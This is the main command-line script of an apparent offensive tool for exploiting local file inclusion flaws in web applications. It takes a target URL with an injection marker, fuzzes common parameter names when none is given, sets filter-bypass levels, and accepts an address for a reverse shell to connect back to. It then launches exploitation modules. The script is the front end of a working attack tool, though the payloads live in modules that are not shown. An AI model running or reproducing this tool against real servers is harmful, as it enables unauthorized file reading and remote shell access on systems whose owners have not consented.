#! /usr/bin/env python

import argparse
import atexit
import os
import signal
import sys
import urllib.parse
from os.path import expanduser

from core.constants import MARKER
from core.filter_bypass import set_level
from core.log import set_global_verbose, err, info, success, set_debug
from core.misc import get_date_time
from core.mode import Mode, print_all_mode_usage
from core.models.req_input import InputRequest
from core.parse_utils import parse_request, validate_marker, parse_get_url, str_to_dict, parse_socket_address, \
    is_valid_url
from core.payload_data import core_get_common_param_names
from core.scan import Scan


def signal_handler(sig, frame):
    sys.exit(0)


def scan_end():
    print(f"[*] scan ending @ {get_date_time()}")


def scan_start():
    print(f"[*] scan starting @ {get_date_time()}")


# Parse -------------------------------------------------------------------------------- #
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', metavar="", type=str,
                    help=f'target (format: "http://www.domain.com/lfi.php?file={MARKER}")')
parser.add_argument('-d', '--data', metavar="", type=str,
                    help=f'data string to be sent through POST (format: "d1={MARKER};d2=val2"))')
parser.add_argument('-c', '--cookie', metavar="", type=str,
                    help=f'cookies (format: "c1={MARKER};c2=val2"))')
parser.add_argument('--header', metavar="", type=str,
                    help=f'HTTP headers (format: "h1={MARKER};h2=val2"))')
parser.add_argument('--proxy', metavar="", type=str,
                    help='set proxy to connect to the target (format: ip:port)')
parser.add_argument('-x', '--method', metavar="", default="GET", type=str,
                    help='HTTP method to use')
parser.add_argument('-v', '--verbose', help="increase output verbosity",
                    action="store_true")
parser.add_argument('-vv', help="debug",
                    action="store_true")
parser.add_argument('-p', '--param', metavar="", help="select parameter to inject")
parser.add_argument('-r', '--request', metavar="", help="parse request from file")
parser.add_argument('-a', '--address', metavar="",
                    help="address where reverse shell will connect back to (format: ip:port)")
parser.add_argument('-s', '--http', type=int, metavar="",
                    help="port which will be used for serving http content, needs to be port forwarded")
parser.add_argument('--batch', action='store_true', help="automatic mode")
parser.add_argument('--redirect', action='store_true', help="follow redirects")
parser.add_argument('-o', '--output', metavar="", help="output folder (default cwd)")
parser.add_argument('--module', nargs=argparse.REMAINDER,
                    help="exploit only specific module",
                    choices=list(Mode))
parser.add_argument('--level', metavar="", type=int, default=1, help="bypass level (1-3)")

# Get args ------------------------------------------------------------------------------ #

request = InputRequest()

args = parser.parse_args()

set_global_verbose(args.verbose)
set_debug(args.vv)
set_level(args.level)

output: str = args.output

if output is None or not os.path.isabs(output):
    output = os.getcwd()

batch: bool = args.batch

# req related args
input_url: str = args.url
input_data: str = args.data
input_cookies: str = args.cookie
input_headers: str = args.header
input_method: str = args.method
input_proxy: str = args.proxy
follow_redirects: bool = args.redirect

input_parse_file: str = args.request
input_param_force: str = args.param
input_local_address: str = args.address
input_http_port: int = args.http

input_module = args.module

# Mode -------------------------------------------------------------------------------- #
mode = None

if input_module is not None:

    if len(input_module) == 0:
        print_all_mode_usage()
    else:
        input_mode = input_module.pop(0)

        for item in Mode:
            if item.value == input_mode:
                mode = item
                break

        if not mode:
            err(f"Unknown module <'{input_mode}'>")
            print_all_mode_usage()

if not mode:
    mode = Mode.all

# Http Request ------------------------------------------------------------------------ #
if input_parse_file:

    if input_parse_file[0] == "~":
        input_parse_file = expanduser("~") + input_parse_file[1:]

    info(f"Parsing HTTP request from '{input_parse_file}' ")

    try:
        request = parse_request(input_parse_file)
    except Exception as e:
        err(f"There was an error parsing '{input_parse_file}':\n{str(e)}", exit=True)

    pass
elif input_url:
    # prefix scheme
    if input_url is not None:
        input_url = input_url.strip()
        if not input_url.startswith("http://") and not input_url.startswith("https://"):
            input_url = "http://" + input_url

    if input_proxy is not None:
        if not input_proxy.startswith("http://") and not input_proxy.startswith("https://"):
            input_proxy = "http://" + input_proxy

    if input_method is None:
        input_method = "GET"

    request.method = input_method.upper()

    parsed_url = urllib.parse.urlparse(input_url)

    request.host = parsed_url.netloc
    parsed_get_url = parse_get_url(input_url)
    request.url_script_path = parsed_get_url[0]

    request.params = parsed_get_url[1]

    request.cookies = str_to_dict(input_cookies)
    request.data = str_to_dict(input_data)
    request.extra_headers = str_to_dict(input_headers)
else:
    err("No Url given", exit=True)
# Get param ---------------------------------------------------------------------------- #

if not is_valid_url(request.url_script_path):
    err("Invalid Url given", exit=True)

if input_param_force:
    if input_param_force in request.params:
        request.params[input_param_force] = MARKER
    elif input_param_force in request.data:
        request.data[input_param_force] = MARKER
    elif input_param_force in request.cookies:
        request.cookies[input_param_force] = MARKER
    elif input_param_force in request.extra_headers:
        request.extra_headers[input_param_force] = MARKER

# validate input
amount = validate_marker(request)

quick_guess = False

if amount != 1:

    amount_possible_injections = len(request.params) + len(request.data) + len(
        request.cookies)

    if amount_possible_injections == 0:
        # guess GET params
        info("Try guessing parameters")
        quick_guess = True

    elif amount_possible_injections == 1:
        if request.params:
            request.params[list(request.params.keys())[0]] = MARKER
        if request.data:
            request.data[list(request.data.keys())[0]] = MARKER
        elif request.cookies:
            request.cookies[list(request.cookies.keys())[0]] = MARKER
    else:
        err(f"I need exactly one marker <'{MARKER}'> to work with! Found {amount}", exit=True)

address = None
if input_local_address:
    address = parse_socket_address(input_local_address)

if __name__ == "__main__":
    # ignore any ssh cert warnings
    import urllib3

    urllib3.disable_warnings()

    import http.client

    http.client._MAXLINE = 1000000

    # dump(req_input)

    atexit.register(scan_end)
    scan_start()
    signal.signal(signal.SIGINT, signal_handler)

    if quick_guess:

        info("No param given, try fuzzing common parameters")

        for param in core_get_common_param_names():
            info(f"Check: '{param}'")
            request.params = {param: MARKER}
            scan = Scan(request, input_proxy, mode=mode, input_mode_params=input_module, address=address,
                        http_port=input_http_port,
                        follow_redirects=follow_redirects, output_dir=output, batch=batch)
            scan.quick_target_check(param_fuzzing=True)

            if scan.filter_bypass:
                success(f"'{param}' is injectable")
                scan.start()
                break

    else:
        scan = Scan(request, input_proxy, mode=mode, input_mode_params=input_module, address=address,
                    http_port=input_http_port,
                    follow_redirects=follow_redirects, output_dir=output, batch=batch)
        scan.start()
